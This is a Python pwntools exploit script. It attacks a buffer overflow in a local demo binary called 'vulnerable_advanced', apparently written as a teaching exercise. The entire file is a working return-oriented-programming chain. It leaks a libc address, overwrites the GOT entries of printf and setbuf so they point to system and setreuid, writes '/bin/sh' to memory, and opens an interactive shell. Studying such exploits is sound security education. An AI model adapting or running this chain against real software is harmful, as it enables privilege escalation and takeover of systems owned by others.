#!/usr/bin/env python3

'''
Version:        1.0
Author:         Florian Hofhammer
Description:    This script tries to exploit the buffer overflow vulnerability in the vulnerable_advanced executable
                by executing it locally and piping the exploit string to its stdin.
                This script only works with the executable compiled with the optimization compiler flags from the Makefile
                of this directory. This specifically includes the code being optimized by the compiler (i.e. with
                optimization flags like the -O3 compiler flag for GCC).
'''

from pwn import *
from struct import pack, unpack

write_plt    = 0x401070         # address of write@plt
read_plt     = 0x4010a0         # address of read@plt
printf_plt   = 0x401090         # address of printf@plt
printf_got   = 0x404028         # printf()'s GOT entry
setbuf_plt   = 0x401080         # address of setbuf@plt
setbuf_got   = 0x404020         # setbuf()'s GOT entry
pop3ret      = 0x4011d4         # gadget to pop rdi; pop rsi; pop rdx; ret (from helper function)
printf_off   = 0x064e10         # printf()'s offset in libc.so.6
system_off   = 0x055410         # system()'s offset in libc.so.6
setreuid_off = 0x117920         # setreuid()'s offset in libc.so.6
writeable    = 0x404058         # location to write "/bin/sh" to (here: location in .bss section)

# Padding
buf = bytearray()
buf += b'A' * 184               # padding to RIP's offset

# Leak printf()'s libc address using write@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x1)          # stdout
buf += pack('<Q', printf_got)   # address to read from
buf += pack('<Q', 0x8)          # number of bytes to write to stdout
buf += pack('<Q', write_plt)    # return to write@plt

# Payload for stage 1: overwrite printf()'s GOT entry using read@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x0)          # stdin
buf += pack('<Q', printf_got)   # address to write to
buf += pack('<Q', 0x8)          # number of bytes to read from stdin
buf += pack('<Q', read_plt)     # return to read@plt
# Overwrite setbuf()'s GOT entry using read@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x0)          # stdin
buf += pack('<Q', setbuf_got)   # address to write to
buf += pack('<Q', 0x8)          # number of bytes to read from stdin
buf += pack('<Q', read_plt)     # return to read@plt

# Payload for stage 2: read "/bin/sh" into writeable location using read@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x0)          # junk
buf += pack('<Q', writeable)    # location to write "/bin/sh" to
buf += pack('<Q', 0x8)          # number of bytes to read from stdin
buf += pack('<Q', read_plt)     # return to read@plt

# Payload for stage 3: call setreuid(0, 0)
# buf += pack('<Q', pop3ret)      # pop rdi; pop rsi; ret
# buf += pack('<Q', 0x0)          # UID 0
# buf += pack('<Q', 0x0)          # GID 0
# buf += pack('<Q', 0x1)          # junk
buf += pack('<Q', setbuf_plt)   # return to setbuf@plt which due to setbuf@got.plt pointing to setreuid is actually setreuid() now
# Set RDI to location of "/bin/sh", and call system()
buf += pack('<Q', pop3ret)      # pop rdi; ret
buf += pack('<Q', writeable)    # address of "/bin/sh"
buf += pack('<Q', 0x1)          # junk
buf += pack('<Q', 0x1)          # junk
buf += pack('<Q', printf_plt)   # return to printf@plt which due to printf@got.plt pointing to system is actually system() now

vuln = ELF('./vulnerable_advanced')
context.binary = './vulnerable_advanced'
r = vuln.process()

# Stage 1: leak printf address
r.send(buf)                     # send buf to overwrite RIP
reply = r.read()                # receive reply
# print(reply)
d = reply[-8:]                  # we returned to write@plt, so receive the leaked printf() libc address which is the last 8 bytes in the reply

printf_addr = unpack('<Q', d)
log.info(f'printf() is at {hex(printf_addr[0])}')

libc_base = printf_addr[0] - printf_off
log.info(f'libc base address is {hex(libc_base)}')

system_addr = libc_base + system_off
log.info(f'system() is at {hex(system_addr)}')

setreuid_addr = libc_base + setreuid_off
log.info(f'setreuid() is at {hex(setreuid_addr)}')

# Stage 2: send system()'s address to overwrite printf()'s GOT entry
r.send(pack('<Q', system_addr))

# send setreuid()'s address to overwrite setbuf()'s GOT entry
r.send(pack('<Q', setreuid_addr))

# Stage 3: send "/bin/sh" to writable location
r.send('/bin/sh')

r.interactive()
